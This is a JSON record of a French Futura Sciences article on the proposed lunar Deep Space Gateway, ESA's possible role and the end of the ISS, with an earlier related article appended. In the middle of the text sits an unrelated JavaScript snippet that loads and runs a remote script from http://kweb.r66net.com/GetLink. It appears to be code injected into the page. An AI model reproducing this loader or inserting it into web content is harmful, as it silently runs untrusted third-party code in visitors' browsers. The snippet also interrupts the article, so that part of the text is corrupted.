{"title": "Après l'ISS, une Station spatiale internationale près de la Lune ?", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "18/09/2017", "content": "Pour préparer l'exploration humaine de la Lune, de Mars, voire d'un astéroïde, les partenaires de la Station spatiale internationale (ISS) réfléchissent à envoyer un avant-poste à proximité de la Lune. Ce Deep Space Gateway serait davantage un véhicule qu'une station spatiale. Les explications avec Frank De Winne, ancien astronaute de l'Agence spatiale européenne (ESA) et directeur du Centre européen des astronautes. Près de vingt ans après le lancement du premier module de la  Station spatiale internationale  (ISS), Zarya, en novembre 1998, l'Agence spatiale européenne ( ESA ) et les autres partenaires du programme réfléchissent à des projets pour succéder à cette station située à 400 kilomètres d'altitude et qui a si bien rapproché les communautés de scientifiques et d'ingénieurs de nombreux pays. «  Avec tous les partenaires, nous regardons comment, dans un futur proche, nous pourrons desservir l' orbite  basse et au-delà  », nous explique Frank De Winne, conseiller auprès du directeur des vols habités et des opérations à l'ESA et directeur du Centre européen des  astronautes . L'idée qui prévaut aujourd'hui, c'est une «  passerelle vers l'espace profond ( Deep Space Gateway , en anglais)  ». Ce ne sera pas une station spatiale, mais plutôt un «  véhicule qui aura la capacité de naviguer  ». Cet avant-poste orbital permettra de «  voir comment ce véhicule peut supporter des missions lunaires  robotiques  et habitées et nous aidera à développer un véhicule pour  explorer Mars avec des humains  ». Il sera installé à proximité de la  Lune , sur une orbite qui n'est pas encore précisée. Concept américain d'un Deep Space Gateway à proximité de la Lune. © Nasa, Boeing                               Le Deep Space Gateway, un avant-poste de l'exploration spatiale Cette passerelle vers l'espace profond n'est pas un programme officiellement approuvé. Pour l'instant, «  il s'agit seulement d'études très préliminaires  ». Les équipes de l'ESA travaillent autour d'une configuration minimale et très basique composée de trois modules avec un diamètre identique à celui de l'ISS (4,5 mètres) : on comptera «  un module de vie, un de service et le module de propulsion qui sera électrique  ». Ce futur véhicule sera doté d'au moins deux ports d'amarrage utilisant un «  standard commun  à toutes les agences spatiales partenaires du programme de l'ISS pour l'amarrage des véhicules spatiaux  ». L'ESA pourrait proposer le  port d'amarrage standardisé  qu'elle développe actuellement avec la société belge QinetiQ Space NV. Ce standard ( International Docking System Standard  ou IDSS) devrait également être adopté par la Russie et le secteur privé, ce qui laisse penser qu'il deviendrait une norme internationale. Enfin, ce véhicule sera desservi par le  vaisseau Orion , de la Nasa, «  auquel  l'ESA   participe en fournissant le  module de service  » et qui pourra transporter quatre astronautes. La capacité d'hébergement du Deep Space Gateway sera également de quatre astronautes puisqu'il sera «  dimensionné selon les capacités de transport du véhicule  Orion  ».  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  D'une masse totale de moins de 20 tonnes, à comparer avec les 400 tonnes de l'ISS, ce Deep Space Gateway pourrait être «  assemblé en orbite en seulement quatre lancements  ». La construction de cet avant-poste de l'exploration pourrait débuter dans «  la première partie des années 2020  », ce qui nécessiterait que les ministres des États membres de l'ESA «  autorisent  [cette dernière]  à participer à ce programme  » lors de la session du conseil de l'ESA au niveau ministériel qui se réunira en 2019. Ce programme sera international. Pour l'instant, l'ESA n'a pas encore décidé quel sera «  son rôle  [...]  mais  différentes options sont à l'étude  ». L'agence a montré son intérêt pour la «  propulsion électrique, les systèmes de support de vie et les télécommunications  ». Forte d'un héritage significatif, avec des programmes emblématiques du savoir-faire de l'industrie spatiale européenne (comme «  le module Columbus, le Spacehab des navettes ou encore le  véhicule automatique  ATV  »), l'ESA voudra «  capitaliser sur ce qu'elle sait faire  ». L'avenir incertain de l'ISS Quant à la  Station spatiale internationale , sa «  fin de vie  est prévue en 2024, voire 2028  ». Les partenaires du programme n'ont évidemment pas l'intention de quitter l'orbite basse et tous «  ont la volonté d'y maintenir une présence humaine  ». Là aussi, plusieurs scénarios sont à l'étude, dont une «  extension de la Station qui pourrait se faire dans le cadre d'un partenariat avec le secteur privé  ». Comme la Nasa, l'ESA est prête à accompagner la «  commercialisation de l'orbite basse de façon à stimuler son secteur industriel spatial  ». Elle n'exclut pas non plus d'utiliser des services privés pour le ravitaillement de ce Deep Space Gateway. «  Nous serons ouverts aux meilleures options qui se présenteront à nous le moment venu.  » Pour en savoir plus Après-ISS : une future station proche de la Lune ? Article de Rémy Decourt publié le 16/09/2016 Que feront les agences spatiales partenaires de l'ISS quand la Station, en fin de service, sera précipitée dans l' atmosphère , vraisemblablement d'ici 2028 ? Toutes veulent poursuivre une collaboration du même genre, qui a si bien rapproché les communautés de scientifiques et d'ingénieurs de nombreux pays. L'une des hypothèses est celle d'une autre station, peut-être en orbite lunaire, qui servirait à des explorations lointaines et à des activités permanentes, services d'entretien des engins spatiaux ou séjours touristiques... Depuis quelques années, les discussions s'intensifient sur les projets qui succéderont à la  Station spatiale internationale . L'idée est moins de définir une feuille de route que d'étudier la meilleure façon d'utiliser les ressources financières des agences spatiales de ce programme historique quand il aura pris fin. Dix-huit ans après le lancement du premier module, Zarya, en novembre 1998, il est prévu de la désorbiter en 2024, voire 2028. Les partenaires du programme ont donné leur accord pour l' exploiter jusqu’en 2024 , à l'exception de l'Agence spatiale européenne qui se prononcera en décembre, lors de la prochaine session de son Conseil ministériel. La Station n'est peut-être pas une grande réussite scientifique mais, depuis 2012, elle offre une grande partie du potentiel pour lequel elle a été conçue. Cette réalisation internationale est avant tout un succès politique et technologique sans précédent. Initié pendant la guerre froide, ce projet a permis aux États-Unis de ravir aux Russes la première place dans le domaine de l'exploitation de l'orbite basse terrestre et de maintenir à flot des pans entiers de l'industrie spatiale russe. Techniquement, c'est également un exemple unique et réussi d'une coopération internationale qui a permis le rapprochement de méthodes de travail et de normes très différentes. Concept d'habitat spatial, à proximité de la Lune, autour duquel travaillent la Nasa et l'ESA. © Nasa, ESA                               Depuis la Lune vers Mars Malgré les tensions politiques entre la Russie et les autres nations, la coopération entre agences spatiales se  porte  bien. Récemment, la Nasa et Roscosmos se sont réunies pour discuter de l'avenir de ce programme et la suite à lui donner. Et les idées ne manquent pas. Dans le privé comme dans le public, on travaille sur cette nouvelle conquête de l'espace et chacun échafaude sa stratégie et ses scénarios de missions, comme Elon Musk qui promet une  colonisation de Mars . Parmi les hypothèses étudiées, l'un se détache du peloton : installer à proximité de la Lune une station spatiale qui pourrait servir de plateforme à l'exploration de notre satellite naturel mais aussi de tremplin pour des  missions habitées à destination de Mars  ou d' astéroïdes . Cette station s'apparenterait donc davantage à un poste avancé de l'exploration. Elle sera dotée de  ports d’amarrage  répondant à un même standard international, ce qui lui permettra d'accueillir les véhicules spatiaux de tous les pays. Elle servira à la  maintenance  des modules et véhicules orbitaux, l'assemblage et la réparation des véhicules qui s'en iront au-delà de la Lune. Un segment de cette station pourrait être réservé au secteur privé pour la commercialisation d'activités scientifiques, de recherche et de tourisme spatial. Dans le futur, l'Homme pourrait s'implanter durablement sur le sol lunaire mais aussi s'installer en orbite lunaire. L'ESA se place sur cette double stratégie. © ESA, Foster Partners                               L'ESA imagine un hub spatial Absente de cette réunion, l'Agence spatiale européenne a également son idée sur ce sujet. Elle étudie l'intérêt d'une station spatiale habitable, de plus petites dimensions que l'ISS et située au  point de Lagrange L2  du système Terre-Lune. Desservie par le  véhicule habité Orion  de la Nasa, auquel l'ESA participe en fournissant le  module de service , elle ne serait pas occupée en permanence. Cette station lointaine serait habitée par des astronautes pour des  durées  qui resteraient limitées dans un premier temps. Elle pourrait par exemple être utilisée pour télé-opérer des missions robotiques à la  surface de la Lune . Cette halte pourrait également servir lors de  transits  de retours d'échantillons prélevés dans le  Système solaire  avant d'être descendus sur  Terre . Elle serait aussi une sorte de «  hub  » pour les astronautes qui se rendraient sur la Lune. ", "theme": "sciences"}